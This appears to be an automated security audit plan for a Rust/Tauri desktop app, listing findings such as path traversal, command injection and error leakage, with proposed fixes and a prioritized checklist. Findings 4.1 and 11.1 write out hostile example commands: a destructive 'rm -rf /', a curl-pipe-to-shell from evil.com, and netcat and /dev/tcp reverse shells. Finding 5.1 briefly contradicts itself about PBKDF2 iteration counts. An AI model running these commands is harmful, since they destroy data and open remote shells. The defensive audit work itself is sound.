# Security, Quality & Modularity Audit Plan

**Project**: SelfHost Helper (Rust + Tauri v2)
**Scope**: `src-tauri/src/` — all Rust backend code
**Date**: 2026-06-14
**Auditor**: opencode (automated)

---

## Table of Contents

1. [SQL Injection Prevention](#1-sql-injection-prevention)
2. [Memory Safety](#2-memory-safety)
3. [Input Validation & Path Traversal](#3-input-validation--path-traversal)
4. [Command Injection](#4-command-injection)
5. [Cryptographic Security](#5-cryptographic-security)
6. [Error Leakage](#6-error-leakage)
7. [Audit Logging](#7-audit-logging)
8. [Debug/Verbose Modes](#8-debugverbose-modes)
9. [Platform Support](#9-platform-support)
10. [Performance](#10-performance)
11. [Backdoor/Reverse Shell Prevention](#11-backdoorreverse-shell-prevention)
12. [SMO Modularity](#12-smo-modularity)

---

## 1. SQL Injection Prevention

**Overall Risk**: LOW — All queries use parameterized statements.

### Findings

| # | Severity | File:Line | Finding | Action | Effort |
|---|----------|-----------|---------|--------|--------|
| 1.1 | **Low** | `db/projects_repo.rs:144` | LIKE pattern constructed via `format!("%{}%", query)` — safe because parameterized, but special LIKE chars (`%`, `_`) in user input are not escaped | Add `escape_like_pattern()` helper that escapes `%` and `_` in user input before wrapping in `%..%` | 0.5h |
| 1.2 | **Info** | `db/connection.rs:13-15` | WAL mode, foreign keys, busy_timeout all correctly configured | No action needed | — |
| 1.3 | **Info** | `db/projects_repo.rs`, `db/categories_repo.rs`, `services/settings_service.rs` | All INSERT/UPDATE/DELETE/SELECT queries use `params![]` macro | No action needed | — |
| 1.4 | **Info** | `services/settings_service.rs:40-53` | Schema creation uses `execute_batch` with hardcoded DDL — safe | No action needed | — |

### Summary

No SQL injection vectors found. The LIKE pattern escaping (1.1) is a defense-in-depth measure — currently `%` and `_` in search terms could match more than intended, but this is a correctness bug, not a security hole.

---

## 2. Memory Safety

**Overall Risk**: MEDIUM — No use-after-free or data races (Rust guarantees), but resource leaks and potential deadlocks exist.

### Findings

| # | Severity | File:Line | Finding | Action | Effort |
|---|----------|-----------|---------|--------|--------|
| 2.1 | **High** | `services/git_service.rs:13,74-87` | `repos: Mutex<HashMap<String, Repository>>` — repo cache grows unboundedly. `Repository::clone()` (libgit2) is called every `get_repo()` even when cache hits (line 80-81 clones the repo). The inserted clone (line 85) is never evicted. | Add LRU eviction (cap at ~20 repos), or open-on-demand without caching (libgit2 repos are lightweight). Remove the cache entirely — `Repository::open` is cheap. | 2h |
| 2.2 | **Medium** | `services/git_service.rs:75-78` | `get_repo()` holds `Mutex` lock while calling `Repository::open()` (disk I/O). If disk is slow or FS hangs, all git operations block. | Scope the lock to HashMap access only: lock, check cache, clone result, drop lock, then open if needed. | 1h |
| 2.3 | **Medium** | `services/tunnel_manager.rs:115` | `_log_rx` is immediately dropped — `log_sender` (line 18, 123) sends to a dead channel. Log entries are silently discarded. This is a resource/functionality bug, not a leak. | Either read from `_log_rx` in a spawned task, or remove the channel and the `log_sender` field. | 1h |
| 2.4 | **Low** | `services/lsp_bridge.rs:136-148` | The LSP stdout reader parses `Content-Length` but never reads the actual JSON body. `_content_length` is set but the response bytes are never delivered to pending oneshot channels. `pending` insertions (line 205) are never resolved except on timeout. | Complete the LSP protocol implementation: after reading `\r\n\r\n`, read exactly `content_length` bytes, parse JSON, resolve the matching oneshot sender. | 4h |
| 2.5 | **Low** | `services/lsp_bridge.rs:78-81` | Proxy WebSocket handler takes the first session found (`break` after first iteration) — arbitrary session selection when multiple LSP servers run. | Use the session matching the request's project context, or error if ambiguous. | 1h |
| 2.6 | **Info** | `services/runtime_service.rs:41,65,82,94,100` | Blocking `std::fs` calls inside `async fn`. Tokio's multi-threaded runtime will block an executor thread. | Wrap in `tokio::task::spawn_blocking` or use `tokio::fs`. | 3h |
| 2.7 | **Info** | `services/backup_service.rs:63,68-70` | `File::create` and zip operations are blocking I/O in sync context — acceptable since backup is infrequent and commands are sync. | No change needed (or move to async if backups become large). | — |
| 2.8 | **Info** | `lib.rs:43` | `_log_store` prefix underscore indicates unused field. `LogStore` is created but never written to. | Either wire up LogStore or remove it. | 0.5h |

### Summary

The LSP bridge (2.4) is the most critical — it's non-functional for response routing. The git repo cache (2.1) is a slow memory leak. Blocking I/O in async (2.6) is a correctness concern for production load.

---

## 3. Input Validation & Path Traversal

**Overall Risk**: HIGH — Multiple commands accept arbitrary paths/commands without validation.

### Findings

| # | Severity | File:Line | Finding | Action | Effort |
|---|----------|-----------|---------|--------|--------|
| 3.1 | **Critical** | `lib.rs:304-330` | `start_process(project_path, command)` — passes `command` directly to `sh -c` (Unix) or `cmd /c` (Windows). No validation of `project_path` existence, no restriction on `command` content. Any shell command can be executed. | See Finding 4.1 (command injection). Additionally: validate `project_path` is a real directory and belongs to a registered project. | 2h |
| 3.2 | **High** | `lib.rs:544-550` | `git_clone(url, dest_path)` — `url` is passed directly to `Repository::clone()`. A `file://` URL or SSH URL can read arbitrary filesystem paths. `dest_path` is unrestricted. | Validate `dest_path` is within allowed directories. Validate `url` scheme (allow `https://`, `http://`, `ssh://` — reject `file://`). | 1.5h |
| 3.3 | **High** | `lib.rs:968-979` | `open_file(path)`, `open_folder(path)`, `open_external(url)` — `opener::open()` launches the OS default handler. No path validation. Could open `file:///etc/passwd` or execute `mailto:` links. | Validate `path` is absolute and within project roots for `open_file`/`open_folder`. For `open_external`, restrict to `https://` scheme. | 1.5h |
| 3.4 | **High** | `services/backup_service.rs:137-143` | `delete_backup(filename)` — joins `filename` to `backup_dir` without sanitization. `filename = "../../etc/important"` would traverse outside the backup directory. | Validate `filename` contains no path separators, `..` components, or null bytes. Use `Path::file_name()` to strip to basename. | 0.5h |
| 3.5 | **Medium** | `lib.rs:678-699` | `search_files(directory, query)` — `directory` is passed to ripgrep with no validation that it exists or is within project scope. | Validate directory exists and is within allowed project roots. | 0.5h |
| 3.6 | **Medium** | `lib.rs:917-928` | `start_lsp_server(project_path, server_command, args)` — `server_command` is executed via `Command::new()`. Arbitrary binary execution. | See Finding 4.3. Validate `server_command` is a known/whitelisted LSP binary, or at minimum validate `project_path`. | 1h |
| 3.7 | **Medium** | `utils/path_security.rs:77-123` | `parse_media_url()` handles `media://` URLs. The Windows drive-letter detection (line 110-114) trusts a single-character hostname — could be crafted. | Ensure downstream consumers always call `validate_media_path()` after parsing. Document that `parse_media_url` alone is not safe. | 0.5h |
| 3.8 | **Low** | `services/tunnel_manager.rs:78-106` | Tunnel args built from user-provided `port`, `token`, `config` values. `config` HashMap values are passed as CLI args to `cloudflared`. | Validate `token` format (alphanumeric + dashes). Validate `config` keys against a whitelist (`protocol`, `noTLSVerify`, `httpHostHeader`). | 1h |
| 3.9 | **Low** | `lib.rs:1009-1020` | `refresh_tray_menu` reads all projects from DB — no input validation needed, but exposes full project list to frontend. | Informational only — ensure frontend controls access. | — |

### Summary

The most dangerous vectors are `start_process` (arbitrary shell execution) and `git_clone` (filesystem read via file:// URLs). The `delete_backup` path traversal is trivially exploitable. `open_file`/`open_folder` can open any file on the system.

---

## 4. Command Injection

**Overall Risk**: CRITICAL — Multiple process spawning points accept user-controlled input.

### Findings

| # | Severity | File:Line | Finding | Action | Effort |
|---|----------|-----------|---------|--------|--------|
| 4.1 | **Critical** | `lib.rs:311-329` | `start_process` passes `command` string to `sh -c` (Unix) or `cmd /c` (Windows). A malicious `command` like `; rm -rf /` or `&& curl evil.com \| sh` executes arbitrary code with the app's privileges. **This is an intentional feature** (running project commands), but there's no sandboxing, no confirmation, and no restriction. | **Design decision needed**: If this is meant to run arbitrary user commands (like npm start), document the security model. If not, restrict to whitelisted commands. At minimum: log all executed commands, validate `project_path` is a registered project, and consider a confirmation dialog for non-standard commands. | 4h |
| 4.2 | **High** | `services/tunnel_manager.rs:108-113` | `Command::new("cloudflared")` — the binary name is hardcoded (safe), but if `cloudflared` is not in PATH, an attacker could place a malicious binary in a PATH directory earlier than the legitimate one. | Use absolute path to `cloudflared` resolved at startup via `which::which()`, and cache the result. | 1h |
| 4.3 | **High** | `services/lsp_bridge.rs:112-119` | `Command::new(server_command)` — `server_command` comes directly from the frontend. Arbitrary binary execution with arbitrary `args`. | Validate `server_command` against a whitelist of known LSP servers, or require it to be within the project's `node_modules/.bin` or similar trusted path. | 2h |
| 4.4 | **Medium** | `services/search_service.rs:73` | `Command::new("rg")` — hardcoded binary name (safe). But the `query` string is passed as a positional argument (line 70). Ripgrep interprets it as a pattern, not a shell command — safe from shell injection, but regex injection is possible if `regex_mode` is true. | When `regex_mode` is true, validate the regex compiles before passing to ripgrep to prevent regex DoS (ReDoS). | 1h |
| 4.5 | **Medium** | `services/runtime_service.rs:188-195` | `Command::new("node")` with `--list-remote lts` — hardcoded args, safe. | No action needed. | — |
| 4.6 | **Low** | `lib.rs:333-348` | `stop_process(pid)` — PID is a `u32`, no injection risk. But `SIGKILL` is immediate with no process tree cleanup. | Consider using `SIGTERM` first, then `SIGKILL` after timeout. On Windows, `/T` flag already kills the tree. | 1h |

### Summary

`start_process` is the primary attack surface — it's an intentional shell execution feature. The LSP bridge (`server_command`) is equally dangerous but less obviously intentional. Both need a clear security model and restrictions.

---

## 5. Cryptographic Security

**Overall Risk**: LOW — Crypto implementation is solid.

### Findings

| # | Severity | File:Line | Finding | Action | Effort |
|---|----------|-----------|---------|--------|--------|
| 5.1 | **Info** | `utils/crypto.rs:12` | `KDF_ITERATIONS: u32 = 310_000` — exceeds OWASP recommendation of 600,000 for PBKDF2-HMAC-SHA256 as of 2024. Actually wait — OWASP recommends 600,000 for SHA256. 310,000 is below current best practice. | Increase to 600,000 iterations for forward-looking security. Note: this is a breaking change for existing backups — implement versioned KDF or migration path. | 2h |
| 5.2 | **Info** | `utils/crypto.rs:109-112` | Salt and IV generated from `OsRng` (CSPRNG) — correct. 16-byte salt, 12-byte nonce — correct for AES-256-GCM. | No action needed. | — |
| 5.3 | **Info** | `utils/crypto.rs:115-125` | AES-256-GCM correctly separates ciphertext and auth tag (lines 121-125). | No action needed. | — |
| 5.4 | **Info** | `utils/crypto.rs:106-107, 152-153` | Passphrase emptiness check uses `trim().is_empty()` — good. | No action needed. | — |
| 5.5 | **Low** | `utils/crypto.rs:162-166` | On decrypt, if `iterations` in the backup file is 0, it falls back to `KDF_ITERATIONS`. This means a malicious backup file with `iterations: 1` could be crafted to speed up brute-force. However, the attacker would need to know the encryption is using a low iteration count, and the backup is local-only. | Validate minimum iteration count on decrypt (e.g., reject if < 100,000). | 0.5h |
| 5.6 | **Info** | `utils/crypto.rs:201-216` | `now_iso8601()` manually formats ISO 8601. Works correctly but could use `chrono::Utc::now().to_rfc3339()` which is already available as a dependency. | Replace with `chrono::Utc::now().to_rfc3339()` for correctness and reduced code. | 0.5h |

### Summary

The crypto is well-implemented. The main improvement is increasing PBKDF2 iterations to match current OWASP guidance (5.1), with a migration strategy for existing backups.

---

## 6. Error Leakage

**Overall Risk**: MEDIUM — Errors leak internal details to the frontend.

### Findings

| # | Severity | File:Line | Finding | Action | Effort |
|---|----------|-----------|---------|--------|--------|
| 6.1 | **Medium** | `error.rs:36-43` | `AppError::serialize()` calls `self.to_string()` which includes variant-specific details. E.g., `AppError::Git("Failed to open repository: <full libgit2 error>")` is sent to the frontend. | Create user-safe error messages per variant. Log the full error server-side, send a generic + error code to frontend. E.g., `{ "code": "GIT_OPEN_FAILED", "message": "Could not open repository" }`. | 4h |
| 6.2 | **Medium** | `error.rs:8-9` | `AppError::Io` wraps `std::io::Error` via `#[from]` — `std::io::Error` messages include OS error codes and sometimes file paths. | Map `io::Error` to a sanitized variant that discards path info. | 1h |
| 6.3 | **Medium** | `error.rs:31` | `AppError::Rusqlite` wraps `rusqlite::Error` — includes SQL error messages and sometimes query text. | Map to a generic "database error" for frontend, log full error server-side. | 1h |
| 6.4 | **Medium** | `error.rs:15` | `AppError::Http` wraps `reqwest::Error` — includes URLs, status codes, and sometimes response bodies. | Strip URLs and response bodies from frontend-facing errors. | 0.5h |
| 6.5 | **Low** | `lib.rs:316,327` | `AppError::Process(e.to_string())` — process spawn errors include the full `std::io::Error` which may leak file paths. | Sanitize process error messages. | 0.5h |
| 6.6 | **Low** | `services/lsp_bridge.rs:48,119` | LSP errors returned as raw `String` — could include file paths, server paths, or internal state. | Wrap in structured error type with sanitized messages. | 1h |

### Summary

Every error variant passes through `to_string()` to the frontend. The fix is a two-layer error model: internal errors with full context for logging, and sanitized error codes/messages for the frontend.

---

## 7. Audit Logging

**Overall Risk**: HIGH — Almost no logging of significant operations.

### Findings

| # | Severity | File:Line | Finding | Action | Effort |
|---|----------|-----------|---------|--------|--------|
| 7.1 | **High** | (global) | **No structured logging for any command.** No Tauri command is logged. `start_process`, `git_clone`, `delete_backup`, `stop_tunnel` — all silent. | Add `tracing::info!` with structured fields at the entry of every `#[tauri::command]` handler. | 4h |
| 7.2 | **High** | (global) | **No authentication/authorization logging.** There's no auth layer at all — any code in the renderer can call any command. | Tauri v2 has allowlist support — configure `tauri.conf.json` capabilities. Add logging for capability checks. | 3h |
| 7.3 | **Medium** | (global) | **No error logging.** Errors are returned to frontend but never logged server-side. `map_err` chains discard error context. | Add `tracing::error!` in error paths, especially for IO, process, and crypto errors. Consider a `log_error` helper. | 3h |
| 7.4 | **Medium** | `services/tunnel_manager.rs` | Tunnel start/stop/status changes are not logged. Network-facing operations should always be logged. | Add `tracing::info!` with project_id, port, mode for tunnel lifecycle events. | 1h |
| 7.5 | **Medium** | `services/backup_service.rs` | Backup create/restore/delete operations are not logged. These modify data at rest. | Log backup operations with filename, size, and outcome. | 1h |
| 7.6 | **Medium** | `services/update_service.rs` | Update check/install operations are not logged. | Log update lifecycle: checking, available, downloading, installed, failed. | 1h |
| 7.7 | **Low** | `lib.rs:119` | `tray::create_tray(&handle).ok()` — tray creation failure is silently swallowed. | Log the error if tray creation fails. | 0.5h |

### Summary

The app has zero operational visibility. In production, you'd have no way to diagnose issues, detect abuse, or audit user actions. This is the highest-priority quality gap.

---

## 8. Debug/Verbose Modes

**Overall Risk**: LOW — Basic tracing is configured but not user-controllable.

### Findings

| # | Severity | File:Line | Finding | Action | Effort |
|---|----------|-----------|---------|--------|--------|
| 8.1 | **Low** | `lib.rs:49-51` | `tracing_subscriber::fmt()` with `with_env_filter("info,selfhost_helper=debug")` — hardcoded. Users cannot increase verbosity without setting `RUST_LOG`. | Add a settings option to control log level. Re-initialize the filter or use a reloadable filter layer. | 2h |
| 8.2 | **Low** | (global) | No log file output configured — logs go to stderr only. In production, Tauri's `tauri_plugin_log` may capture them, but the `tracing_subscriber` and `tauri_plugin_log` are separate. | Unify logging: either use `tracing` exclusively (with `tracing-appender` for file output) or `tauri_plugin_log` exclusively. | 2h |
| 8.3 | **Info** | `services/settings_service.rs:21` | `dev_mode` setting exists in `AppSettings` but is never checked by backend code. It's only used by the renderer. | Wire `dev_mode` into tracing filter adjustment, or remove if unused. | 1h |

### Summary

The tracing setup works but isn't integrated with Tauri's logging plugin and isn't user-controllable.

---

## 9. Platform Support

**Overall Risk**: MEDIUM — Core platforms covered, but edge cases exist.

### Findings

| # | Severity | File:Line | Finding | Action | Effort |
|---|----------|-----------|---------|--------|--------|
| 9.1 | **Medium** | `lib.rs:309-329` | `start_process`: Windows uses `cmd /C start /B cmd /c &command` — double shell wrapping. Unix uses `sh -c`. On Windows, this creates a detached process that may not be killable via PID. | On Windows, use `cmd /c &command` without the extra `start /B` wrapper, or use `CREATE_NEW_PROCESS_GROUP` flag for proper process management. | 2h |
| 9.2 | **Medium** | `lib.rs:346` | `stop_process`: Unix sends `SIGKILL` (immediate, no cleanup). No signal handling, no graceful shutdown. | Send `SIGTERM` first, wait with timeout, then `SIGKILL`. | 1h |
| 9.3 | **Low** | `services/runtime_service.rs:236-244` | `get_node_download_url` doesn't handle `aarch64-windows` (Windows on ARM). | Add Windows ARM support or return a clear error. | 0.5h |
| 9.4 | **Low** | `services/runtime_service.rs:256-266` | `get_python_download_url` doesn't handle `aarch64-windows`. Also missing `x86` (32-bit) for all platforms. | Add Windows ARM and 32-bit variants, or document unsupported. | 0.5h |
| 9.5 | **Low** | `utils/path_security.rs:17-27` | `normalize_for_comparison` lowercases on Windows (correct for case-insensitive FS) but not on Linux/macOS (correct). However, macOS APFS is case-insensitive by default — `Normalize` doesn't account for this. | Document macOS case-insensitivity behavior, or add macOS case-folding similar to Windows. | 1h |
| 9.6 | **Info** | `utils/media_allowlist.rs:40` | `parse_env_dirs` correctly uses `;` on Windows, `:` on Unix for PATH-style delimiter. | No action needed. | — |

### Summary

The Windows process management (9.1) is the most significant issue — double-wrapping in `cmd` creates orphaned processes. macOS case-insensitivity (9.5) is a subtle correctness risk.

---

## 10. Performance

**Overall Risk**: MEDIUM — Several unnecessary clones and blocking operations.

### Findings

| # | Severity | File:Line | Finding | Action | Effort |
|---|----------|-----------|---------|--------|--------|
| 10.1 | **Medium** | `services/search_service.rs:160` | `results.clone()` — the entire `Vec<SearchResult>` is cloned just to extract `.len()` for stats. | Take stats before the clone, or compute `total_matches` from `results.len()` before returning. Remove the clone. | 0.5h |
| 10.2 | **Medium** | `services/git_service.rs:85` | `repos.insert(project_path.to_string(), repo.clone())` — `Repository::clone()` is a cheap Arc increment, but storing it in a HashMap means the HashMap grows forever. Also, `project_path.to_string()` allocates on every call even on cache hit. | Remove the cache (see 2.1). If keeping it, use a bounded LRU cache. | 1h |
| 10.3 | **Medium** | `services/log_store.rs:38` | `entry.clone()` on every `push()` — `LogEntry` contains 4 `String` fields. With high-throughput logging, this causes significant allocation churn. | Use `Arc<LogEntry>` or restructure to avoid cloning. | 1h |
| 10.4 | **Low** | `services/git_service.rs:265-283` | `get_diff_summary` iterates all deltas by index (`nth(delta_idx)`) — `nth()` is O(n) for each call, making the total O(n²). | Use `.iter()` directly on `diff.deltas()` instead of index-based access. | 0.5h |
| 10.5 | **Low** | `services/runtime_service.rs:41,65,82` | Blocking `std::fs::read_dir`, `std::fs::write`, `std::fs::File::open` inside `async fn`. These block the Tokio executor thread. | Wrap in `tokio::task::spawn_blocking` or use `tokio::fs` equivalents. | 2h |
| 10.6 | **Info** | `services/backup_service.rs:46` | `projects.to_vec()` and `categories.to_vec()` — clones all JSON values for the backup payload. | Accept references and serialize directly, or document that backup is a snapshot operation. | 0.5h |

### Summary

The ripgrep results clone (10.1) and git diff O(n²) (10.4) are quick wins. The blocking I/O in async (10.5) matters under concurrent load.

---

## 11. Backdoor/Reverse Shell Prevention

**Overall Risk**: HIGH — Multiple vectors for arbitrary code execution.

### Findings

| # | Severity | File:Line | Finding | Action | Effort |
|---|----------|-----------|---------|--------|--------|
| 11.1 | **Critical** | `lib.rs:304-330` | `start_process(command)` — arbitrary shell command execution. A compromised frontend or malicious project config could execute `nc -e /bin/sh attacker.com 4444` or `bash -i >& /dev/tcp/...`. This is the most dangerous backdoor vector. | **Mitigations**: (1) Log every executed command with full args. (2) Validate `project_path` is a registered project. (3) Consider process sandboxing (Linux namespaces, Windows Job Objects — the `electron/job/` addon exists but isn't used here). (4) Add a "trusted commands" allowlist per project. | 8h |
| 11.2 | **High** | `services/lsp_bridge.rs:112` | `Command::new(server_command)` — arbitrary binary execution. A malicious `server_command` could be anything. | Restrict to whitelisted LSP servers or project-local binaries. | 2h |
| 11.3 | **High** | `services/tunnel_manager.rs:108` | `cloudflared` spawns a child process that creates an outbound tunnel. If `cloudflared` is compromised or replaced, it could tunnel arbitrary traffic. | Verify `cloudflared` binary integrity (checksum) at startup. Use absolute path. | 2h |
| 11.4 | **Medium** | `services/lsp_bridge.rs:40-103` | LSP proxy binds `127.0.0.1:0` — correct (localhost only). But there's no authentication on the WebSocket. Any local process could connect and send LSP requests. | Add a per-session random token that must be provided in the WebSocket handshake. | 2h |
| 11.5 | **Medium** | `lib.rs:978-979` | `open_external(url)` — could open `file://`, `ssh://`, or custom protocol URLs that trigger application launches. | Restrict to `https://` and `http://` schemes. | 0.5h |
| 11.6 | **Low** | `services/runtime_service.rs:79,138` | `reqwest::get(&url)` downloads runtime binaries over HTTPS — correct. But no certificate pinning or download hash verification. | Verify downloaded archives against official checksums. | 3h |

### Summary

`start_process` is an intentional shell execution feature — the security model must be explicit. The LSP proxy without auth (11.4) is a local privilege escalation vector. Runtime downloads without hash verification (11.6) are a supply chain risk.

---

## 12. SMO Modularity

**Overall Risk**: MEDIUM — Flat architecture with tight coupling.

### Findings

| # | Severity | File:Line | Finding | Action | Effort |
|---|----------|-----------|---------|--------|--------|
| 12.1 | **Medium** | `lib.rs:29-45` | `AppState` is a single monolithic struct holding 14 `Arc`-wrapped services + DB. Every command handler has access to everything. No scope boundaries. | Split into feature-scoped state groups: `GitState`, `TunnelState`, `RuntimeState`, etc. Use Tauri's per-command state injection. | 4h |
| 12.2 | **Medium** | `lib.rs:122-201` | All 70+ commands registered in a flat list. No module organization. | Group commands into modules: `commands/git.rs`, `commands/process.rs`, `commands/tunnel.rs`, etc. | 3h |
| 12.3 | **Medium** | `services/git_service.rs` | `GitService` caches `Repository` objects — tight coupling between service lifecycle and FS state. The cache is never cleared even when projects are deleted. | Remove the repo cache (see 2.1). Let libgit2 handle its own lifecycle. | 1h |
| 12.4 | **Low** | `services/lsp_bridge.rs` | `LspBridge` manages both the LSP process lifecycle AND a WebSocket proxy. Two concerns in one struct. | Split into `LspSessionManager` (process lifecycle) and `LspProxy` (WebSocket server). | 2h |
| 12.5 | **Low** | `db/projects_repo.rs:97-121`, `db/categories_repo.rs:62-79` | Both repos do a SELECT-then-UPDATE pattern (read current, merge, write). This is not atomic — concurrent updates could lose data. | Use SQL `UPDATE ... SET col = COALESCE(?1, col)` pattern for atomic partial updates. | 1h |
| 12.6 | **Info** | `services/` directory | Services are well-separated by concern: git, tunnel, runtime, search, LSP, backup, settings, update, file watcher, log store. | Good foundation — refine boundaries. | — |
| 12.7 | **Info** | `utils/` directory | Utilities are properly isolated: crypto, path_security, media_allowlist, ignore_patterns. | No action needed. | — |
| 12.8 | **Info** | `db/` directory | Two repos + connection — clean separation. | No action needed. | — |

### Summary

The codebase has reasonable service separation but the command layer is flat and monolithic. The `AppState` struct violates scope isolation — every handler can access every service. The non-atomic read-modify-write in repos is a concurrency correctness issue.

---

## Prioritized TODO Checklist

### Critical (must fix before any release)

~ [ ] **C1.** Restrict `start_process` — validate project_path is registered, log all commands, consider sandboxing (`lib.rs:304-330`)
~ [ ] **C2.** Fix `delete_backup` path traversal — sanitize filename to basename only (`services/backup_service.rs:137-143`)
~ [ ] **C3.** Restrict `git_clone` — reject `file://` URLs, validate dest_path (`lib.rs:544-550`)
~ [ ] **C4.** Restrict `open_file`/`open_folder`/`open_external` — validate paths are within project roots, restrict URL schemes (`lib.rs:968-979`)

### High (fix before beta)

~ [ ] **H1.** Remove or bound the git repo cache — prevents memory leak (`services/git_service.rs:13`)
~ [ ] **H2.** Complete LSP response routing — currently non-functional (`services/lsp_bridge.rs:136-148`)
~ [ ] **H3.** Fix tunnel log channel — `_log_rx` is dropped immediately (`services/tunnel_manager.rs:115`)
~ [ ] **H4.** Add structured audit logging to all command handlers (`lib.rs` — all `#[tauri::command]` functions)
~ [ ] **H5.** Sanitize error messages — create two-layer error model (internal + frontend) (`error.rs`)
~ [ ] **H6.** Validate `lsp_bridge` server_command — whitelist or restrict path (`services/lsp_bridge.rs:112`)
~ [ ] **H7.** Add auth token to LSP WebSocket proxy (`services/lsp_bridge.rs:40-103`)
~ [ ] **H8.** Verify `cloudflared` binary at startup (`services/tunnel_manager.rs:108`)

### Medium (fix before v1.0)

~ [ ] **M1.** Increase PBKDF2 iterations to 600,000 with migration path (`utils/crypto.rs:12`)
~ [ ] **M2.** Validate minimum KDF iterations on decrypt (`utils/crypto.rs:162-166`)
~ [ ] **M3.** Fix mutex lock scope in `GitService::get_repo` (`services/git_service.rs:75-78`)
~ [ ] **M4.** Make `start_process` async-compatible — avoid blocking Tokio executor (`services/runtime_service.rs`)
~ [ ] **M5.** Fix Windows process management — remove double `cmd` wrapping (`lib.rs:311-317`)
~ [ ] **M6.** Send `SIGTERM` before `SIGKILL` on Unix (`lib.rs:344-348`)
~ [ ] **M7.** Fix O(n²) diff summary iteration (`services/git_service.rs:265-283`)
~ [ ] **M8.** Remove unnecessary `results.clone()` in search (`services/search_service.rs:160`)
~ [ ] **M9.** Use atomic SQL updates in repos (`db/projects_repo.rs:97-121`)
~ [ ] **M10.** Split monolithic `AppState` into feature-scoped groups (`lib.rs:29-45`)
~ [ ] **M11.** Group commands into modules (`lib.rs:122-201`)
~ [ ] **M12.** Add logging for tunnel, backup, and update lifecycle events
~ [ ] **M13.** Unify tracing setup with Tauri's log plugin (`lib.rs:49-51`)

### Low (fix when convenient)

~ [ ] **L1.** Escape LIKE special chars in project search (`db/projects_repo.rs:144`)
~ [ ] **L2.** Add macOS case-insensitive path normalization (`utils/path_security.rs:17-27`)
~ [ ] **L3.** Handle Windows ARM in runtime download URLs (`services/runtime_service.rs:236-266`)
~ [ ] **L4.** Validate tunnel config keys against whitelist (`services/tunnel_manager.rs:91-105`)
~ [ ] **L5.** Remove or wire up `_log_store` (`lib.rs:43`)
~ [ ] **L6.** Reduce `LogEntry` clones in LogStore (`services/log_store.rs:38`)
~ [ ] **L7.** Make tracing filter user-controllable (`lib.rs:49-51`)
~ [ ] **L8.** Replace manual ISO 8601 with chrono (`utils/crypto.rs:201-216`)
~ [ ] **L9.** Verify downloaded runtime binaries against checksums (`services/runtime_service.rs`)
~ [ ] **L10.** Split LspBridge into session manager + proxy (`services/lsp_bridge.rs`)
~ [ ] **L11.** Log tray creation failures (`lib.rs:119`)
~ [ ] **L12.** Add ReDoS protection for regex search mode (`services/search_service.rs`)

---

## Estimated Total Effort

| Priority | Count | Estimated Hours |
|----------|-------|----------------|
| Critical | 4 | ~10h |
| High | 8 | ~22h |
| Medium | 13 | ~28h |
| Low | 12 | ~12h |
| **Total** | **37** | **~72h** |

---

## Appendix: Files Not Audited (out of scope)

- `src-tauri/tauri.conf.json` — Tauri configuration (capabilities, allowlist, CSP)
- `src-tauri/build.rs` — Build script
- Frontend code (`src/`)
- `electron/` — Legacy Electron code (separate codebase)
